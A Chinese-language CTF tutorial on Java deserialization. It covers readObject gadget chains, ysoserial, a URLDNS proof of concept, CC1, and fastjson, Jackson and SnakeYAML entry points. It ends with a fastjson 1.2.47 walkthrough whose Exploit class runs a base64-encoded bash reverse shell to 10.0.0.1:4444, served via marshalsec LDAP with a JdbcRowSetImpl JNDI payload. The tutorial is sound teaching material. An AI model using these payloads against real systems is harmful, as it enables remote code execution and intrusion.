---
comments: true
---

# Java反序列化

如果你已经学过 [PHP反序列化](./php_unser.md) 一章，那么恭喜你，Java 反序列化的核心思想你已经会了一半。

回忆一下 PHP 反序列化的攻击模型：攻击者控制 `unserialize()` 的输入，精心构造一个序列化字符串，使得反序列化过程中自动触发 `__wakeup()`、`__destruct()` 等魔术方法；再通过把对象当作属性层层嵌套，让这些魔术方法像多米诺骨牌一样依次触发，最终走到 `eval()`、`system()` 这样的危险函数——这就是 **POP 链（Property-Oriented Programming）**。

Java 反序列化几乎是一模一样的故事，只是换了一套角色：

| PHP | Java |
| --- | --- |
| `serialize()` / `unserialize()` | `ObjectOutputStream.writeObject()` / `ObjectInputStream.readObject()` |
| `__wakeup()`、`__destruct()` 等魔术方法 | 类自定义的 `readObject()` 方法 |
| POP 链 | **Gadget Chain**（利用链 / 调用链） |
| `O:4:"User":...` 文本格式 | `AC ED 00 05` 开头的二进制流 |

一句话概括：**PHP 里我们找魔术方法拼 POP 链，Java 里我们找 `readObject()` 及它间接调用的方法拼 gadget chain**。链式调用、属性可控、最终落到危险函数，思想完全相通。

不同的是，PHP 的魔术方法是语言内建的、每个类都能写；而 Java 的 gadget 来自 **代码库里已有的类**——JDK 自身和各种第三方依赖（Commons-Collections、fastjson……）里那些"看起来人畜无害"的类，只要它实现了 `Serializable` 接口、有自定义 `readObject()`、并且方法里会调用可控属性上的其他方法，就可能成为链上的一环。这也是 Java 反序列化漏洞比 PHP 更依赖"环境里有谁"的原因。

## Java 序列化格式与 readObject 触发点

### 最小可运行示例

Java 中一个类只要实现了 `java.io.Serializable` 接口就可以被序列化：

```java
import java.io.*;

public class Demo {
    // 目标类：实现 Serializable 接口
    static class User implements Serializable {
        private String name;
        public User(String name) { this.name = name; }
    }

    public static void main(String[] args) throws Exception {
        User user = new User("Probius_Official");

        // 序列化：对象 -> 字节流
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(user);
        oos.close();

        byte[] data = bos.toByteArray();
        System.out.println(java.util.Base64.getEncoder().encodeToString(data));

        // 反序列化：字节流 -> 对象
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        User back = (User) ois.readObject();
        System.out.println(back.name);
    }
}
```

序列化结果是一段二进制流，用十六进制查看时以 `AC ED 00 05` 开头——`AC ED` 是魔数（`STREAM_MAGIC`），`00 05` 是序列化协议版本（`STREAM_VERSION`）。在渗透测试和 CTF 中，只要看到：

- 十六进制以 `AC ED 00 05` 开头的数据；
- Base64 解码前以 `rO0AB` 开头的字符串（`AC ED 00 05` 的 Base64 形态）；

基本就可以断定这是一个 Java 原生序列化对象，是潜在的反序列化攻击面。

### 触发点：readObject()

关键点在于：**如果目标类自己定义了 `readObject()` 方法，`ObjectInputStream.readObject()` 在还原对象时就会自动调用它**，地位和 PHP 的 `__wakeup()` 相当：

```java
static class Evil implements Serializable {
    private String cmd;

    // 自定义 readObject，反序列化时自动回调
    private void readObject(ObjectInputStream ois) throws Exception {
        ois.defaultReadObject();          // 先正常还原属性
        Runtime.getRuntime().exec(cmd);   // 然后……执行了 cmd
    }
}
```

只要攻击者能控制传入 `readObject()` 的字节流，就能控制 `Evil.cmd` 的值，于是反序列化一个"用户数据"的动作就变成了命令执行。

当然，现实中没人会把 `Runtime.exec` 明晃晃写在自己的 `readObject()` 里。真正的问题是：**程序 classpath 里那些库中的类，它们的 `readObject()` 里做了什么？** 顺着这些调用一路找下去，如果能找到一条从 `readObject()` 出发、途经若干"跳板"方法、最终到达 `Runtime.exec` 或类加载的路径，而且路径上每个对象的属性都能通过序列化数据控制——一条 gadget chain 就诞生了。

## Gadget Chain 与 ysoserial

### 什么是 gadget chain

- **gadget**：链上的一环，通常是某个类中的一个方法（`readObject()`、`hashCode()`、`transform()`……），它会利用自身属性去调用别的方法。
- **gadget chain**：把若干个 gadget 通过"对象作为属性层层嵌套"串起来，使得一次 `readObject()` 调用像多米诺骨牌一样传导到最终的危险调用。

这和 PHP POP 链的构造思路完全一致，区别只是 PHP 拼的是魔术方法，Java 拼的是 `readObject()` 加上各种普通方法。

### ysoserial：开箱即用的链生成器

手工拼链费时费力，安全研究者把历史上公开的链做成了工具 **[ysoserial](https://github.com/frohoff/ysoserial)**。它内置了 CommonsCollections、CommonsBeanutils、JRMPClient、URLDNS 等几十条链，一行命令生成 payload：

```bash
# 需要 Java 环境；从 GitHub Releases 下载 ysoserial.jar
java -jar ysoserial.jar URLDNS "http://xxxx.dnslog.cn" > urldns.ser

java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > cc1.ser
```

然后把生成的 `.ser` 文件（或其 Base64 形式）喂给目标的反序列化入口即可。

使用 ysoserial 有一个必须理解的前提：**payload 是否有效取决于目标环境的 classpath 里有没有对应的依赖及其版本**。比如 `CommonsCollections1` 要求目标存在有漏洞版本的 commons-collections；目标没有的话，这条链在反序列化时连类都找不到，直接抛 `ClassNotFoundException`。所以实战中通常先用不依赖任何第三方库的 **URLDNS 链** 探测——它能触发一次 DNS 请求，只要 DNSLog 平台收到解析记录，就证明目标确实存在反序列化点且我们的 payload 被执行了。

## 手工推导 URLDNS 链

URLDNS 是 ysoserial 中最简单的一条链：只用 JDK 内置类，不依赖任何第三方库，效果是让目标发起一次 DNS 解析（不出网执行命令也能用 DNSLog 外带验证）。它非常适合用来体会"找链"的全过程。

整条链只有三个类：`HashMap` → `URL` → `URLStreamHandler`。

### 第一环：HashMap.readObject()

`java.util.HashMap` 自定义了 `readObject()`，还原键值对时会对每个 key 调用 `hash(key)`：

```java
// java.util.HashMap（JDK 源码，已简化）
private void readObject(ObjectInputStream s) {
    s.defaultReadObject();
    // ... 省略容量计算 ...
    for (int i = 0; i < mappings; i++) {
        K key = (K) s.readObject();
        V value = (V) s.readObject();
        putVal(hash(key), key, value, false, false);   // ← 调用 hash(key)
    }
}

static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);  // ← 调用 key.hashCode()
}
```

也就是说：**只要我们把一个对象放进 HashMap 当 key，反序列化时它的 `hashCode()` 就会被自动调用**。这就是入口 gadget。

### 第二环：URL.hashCode()

`java.net.URL` 重写了 `hashCode()`：

```java
// java.net.URL（JDK 源码，已简化）
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;
    hashCode = handler.hashCode(this);   // handler 是 URLStreamHandler
    return hashCode;
}
```

### 第三环：URLStreamHandler.hashCode() 触发解析

```java
// java.net.URLStreamHandler（JDK 源码，已简化）
protected int hashCode(URL u) {
    // ... 拼接 protocol、host、file 等计算 hash ...
    InetAddress addr = getHostAddress(u);   // ← 这里会对 host 做 DNS 解析！
    // ...
}
```

`getHostAddress()` 内部调用 `InetAddress.getByName(host)`，也就是向 DNS 服务器发起一次对 `host` 的解析请求。如果 host 是 DNSLog 给的子域名，我们就能在平台上看到记录——目标执行了我们的 payload，实锤。

### 串起来

```
HashMap.readObject()
    └── hash(key) → key.hashCode()
            └── URL.hashCode()
                    └── URLStreamHandler.hashCode(this)
                            └── getHostAddress() → DNS 解析 → DNSLog 收到请求
```

### 一个小坑与完整 PoC

直接 `map.put(url, 1)` 会出问题：`put` 时就会触发一次 `hashCode()`，DNS 请求在 **本地生成 payload 时** 就发出去了，而且 URL 的 `hashCode` 字段被缓存成 `-1` 以外的值，反序列化时反而不会再解析。解决办法是先随便放、再反射改回来：

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNSPoC {
    public static void main(String[] args) throws Exception {
        HashMap<URL, Integer> map = new HashMap<>();
        // 先放一个无害的 URL，避免 put 时提前触发解析
        URL url = new URL("http://example.com");
        map.put(url, 1);

        // 反射把 hashCode 改回 -1（未计算状态）
        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);

        // 反射把 host 改成 DNSLog 地址，让解析发生在目标端
        Field hostField = URL.class.getDeclaredField("host");
        hostField.setAccessible(true);
        hostField.set(url, "abcdef.dnslog.cn");

        // 序列化
        FileOutputStream fos = new FileOutputStream("urldns.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map);
        oos.close();
    }
}
```

把生成的 `urldns.ser` 丢给存在反序列化入口的目标，DNSLog 收到 `abcdef.dnslog.cn` 的解析记录，验证成功。实际测试中直接用 `java -jar ysoserial.jar URLDNS "http://abcdef.dnslog.cn"` 即可，手工推导是为了理解链的构造方法。

## CC1 链的思想（CommonsCollections1）

URLDNS 只能发 DNS 请求，要真正 RCE 就需要能执行命令的链。最经典的是 CommonsCollections 系列。这里只讲思想，**不要求背链**——理解了思路，遇到 CC3/CC5/CC11 或 CB 链时对着资料也能看懂。

CC1 依赖 Apache Commons-Collections 库（3.2.1 及以下版本）中的两个关键类：

### InvokerTransformer：任意方法调用器

```java
// org.apache.commons.collections.functors.InvokerTransformer（简化）
public class InvokerTransformer implements Transformer {
    private final String iMethodName;   // 方法名，可控
    private final Object[] iArgs;       // 参数，可控

    public Object transform(Object input) {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, ...);
        return method.invoke(input, iArgs);   // 反射调用 input 上的任意方法！
    }
}
```

`transform(input)` 等价于"对任意对象调用任意方法"。如果 `input` 是 `Runtime.getRuntime()` 的结果、方法名是 `exec`，就是命令执行。这就是链的"终点"。

### TransformedMap：Map 包装器

```java
// org.apache.commons.collections.map.TransformedMap（简化）
public class TransformedMap extends AbstractInputCheckedMapDecorator {
    protected final Transformer valueTransformer;

    // 向这个 Map 里放/改值时，value 会先经过 valueTransformer.transform()
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
}
```

`TransformedMap.decorate()` 可以把一个普通 Map 包装成"改值时自动调用 transformer"的 Map。我们把 `valueTransformer` 设成恶意构造的 `InvokerTransformer`，那么只要反序列化过程中有人调用 `MapEntry.setValue()`，`transform()` 就会被触发，RCE 达成。

### 谁来调用 setValue()

链的最后一环需要一个"在 `readObject()` 里会遍历 Map 并调用 `setValue()`"的类——JDK 的 `sun.reflect.annotation.AnnotationInvocationHandler` 正好干这事：它的 `readObject()` 会遍历成员变量 Map 的 entry，并对不满足条件的 entry 调用 `setValue()`。

于是整条链的思想就是：

```
AnnotationInvocationHandler.readObject()
    └── Map.Entry.setValue()              （TransformedMap 包装的 entry）
            └── InvokerTransformer.transform()
                    └── Method.invoke() → Runtime.exec(cmd)
```

和 URLDNS 完全同一套方法论：**从 readObject 出发，找"属性可控的间接调用"，一环一环拼到危险函数**。后续更通用的链（如利用 `ChainedTransformer` 把多个 transformer 串起来、用 `TemplatesImpl` 加载字节码的版本）都是在这个骨架上替换零件。CTF 中不必手工构造，ysoserial 直接生成即可，但要懂得根据目标依赖版本选链。

## 第三方反序列化入口：fastjson / Jackson

原生 `readObject()` 之外，Java 应用更多通过 JSON 库反序列化外部数据，这是 CTF 里更常见的考点。

### fastjson

fastjson（1.2.x）的 `JSON.parseObject()` 支持一个"特性"：JSON 里写 `@type` 字段指定类名，反序列化时就会实例化该类并调用其 **setter / getter**：

```json
{
  "@type": "com.example.User",
  "name": "admin"
}
```

危险在于：如果 `@type` 指向的类的 setter/getter 里有副作用（比如 `JdbcRowSetImpl` 的 `setDataSourceName` + `setAutoCommit` 会触发 JNDI 查找，进而加载远程恶意类），攻击者就能借 JSON 完成 RCE——这就是著名的 fastjson 反序列化漏洞（1.2.24、1.2.47 等多次绕过史）。

识别 fastjson 入口的小技巧：

- 目标接口接收 JSON，报错信息里出现 `com.alibaba.fastjson` 字样；
- 可以用 `{"@type":"java.net.Inet4Address","val":"xxxx.dnslog.cn"}` 这类 payload 打 DNSLog 探测是否存在 fastjson 及版本区间；
- 1.2.68 之后引入了 safeMode 和更严格的 checkAutoType，低版本（≤1.2.47）基本可直接利用。

fastjson 的"调用 setter/getter"本质上是把 Java 反序列化的触发点从 `readObject()` 换成了属性赋值回调——还是同一个思想。

### Jackson

Jackson 的 `ObjectMapper.readValue()` 默认只反序列化成普通 POJO，但开启 `enableDefaultTyping()` 后同样允许在 JSON 中指定类型（`["com.xxx.ClassName", {...}]`），历史上有多个基于第三方依赖 gadget（如 commons-dbcp 的 `BasicDataSource` 加载 JDBC 驱动执行 SQL/加载类）的 CVE。判断是否受影响看两点：是否开启 default typing、classpath 里是否有可利用的 gadget 依赖。

### 其他

- **SnakeYAML**：`new Yaml().load()` 默认会实例化 YAML 中指定的类（`!!javax.script.ScriptEngineManager` 是经典 payload），在加载自定义配置的 Java 应用里常见。
- **XMLDecoder / XStream**：XML 形式的反序列化，思路相同。

做题流程通常是：**找入口（哪个库、哪个版本）→ DNSLog 探测确认 → 选对应 payload → RCE 或外带 flag**。

## CTF 例题：fastjson 反序列化

> 题型：一道典型的 fastjson 题。题目是一个 Java Web 应用，存在一个 `/login` 接口接收 JSON。拿到 flag 的完整过程如下。

### 1. 发现入口

访问 `/login`，用 Burp 抓包，正常请求形如：

```http
POST /login HTTP/1.1
Host: target:8080
Content-Type: application/json

{"username":"admin","password":"admin"}
```

随手发一个畸形 JSON `{"username":}`，响应里报错：

```
com.alibaba.fastjson.JSONException: syntax error, expect {, actual error ...
```

报错暴露了 `com.alibaba.fastjson`——后端用 fastjson 解析请求体，入口确认。

### 2. DNSLog 探测版本

发送经典的 `@type` 探测 payload：

```http
POST /login HTTP/1.1
Host: target:8080
Content-Type: application/json
Content-Length: 78

{"@type":"java.net.Inet4Address","val":"probe1.xxxx.dnslog.cn"}
```

DNSLog 平台收到 `probe1.xxxx.dnslog.cn` 的解析记录，说明 `@type` 生效，存在 fastjson 反序列化漏洞。再换 `java.net.InetSocketAddress{"address":,"val":"probe2.xxxx.dnslog.cn"}` 等 payload 组合测试，可进一步收窄版本区间；本题中 1.2.47 的绕过 payload 有效。

### 3. 构造利用链（marshalsec + JNDI）

fastjson 1.2.47 的经典利用方式是通过 `java.lang.Class` 加载 `com.sun.rowset.JdbcRowSetImpl`，配合 JNDI 注入加载远程恶意类。利用 [marshalsec](https://github.com/mbechler/marshalsec) 起一个 LDAP 服务：

```bash
# 1) 编写恶意类并编译
cat > Exploit.java <<'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {}
    }
}
EOF
javac Exploit.java

# 2) 用 python 起一个 HTTP 服务托管 Exploit.class
python3 -m http.server 8000

# 3) 启动 marshalsec LDAP 服务，指向上面的 HTTP 服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
    "http://10.0.0.1:8000/#Exploit" 1389
```

发送 1.2.47 绕过 payload：

```http
POST /login HTTP/1.1
Host: target:8080
Content-Type: application/json
Content-Length: 183

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://10.0.0.1:1389/Exploit",
        "autoCommit":true
    }
}
```

fastjson 会实例化 `JdbcRowSetImpl`，`autoCommit` setter 触发 JNDI 连接我们的 LDAP 服务，目标下载并加载 `Exploit.class`，静态代码块执行——反弹 shell 到手，`cat /flag` 收工。

### 4. 复盘：这和 POP 链有什么关系

回头看这道题，其实什么都没变：

- **入口**：fastjson 的 `parseObject()` ↔ PHP 的 `unserialize()` ↔ 原生 Java 的 `readObject()`；
- **回调点**：fastjson 调用的 setter/getter ↔ PHP 的魔术方法 ↔ 自定义 `readObject()`；
- **gadget**：`JdbcRowSetImpl.setAutoCommit()` 里的 JNDI 查找 ↔ POP 链末端调用的危险函数。

学会了 PHP 反序列化的"链式思维"，Java 反序列化要补的不过是：Java 序列化格式的特征识别、ysoserial 的使用、几条经典链的触发逻辑，以及 fastjson/Jackson 这类第三方入口的探测手法。剩下的，交给 DNSLog 和靶场练习即可。
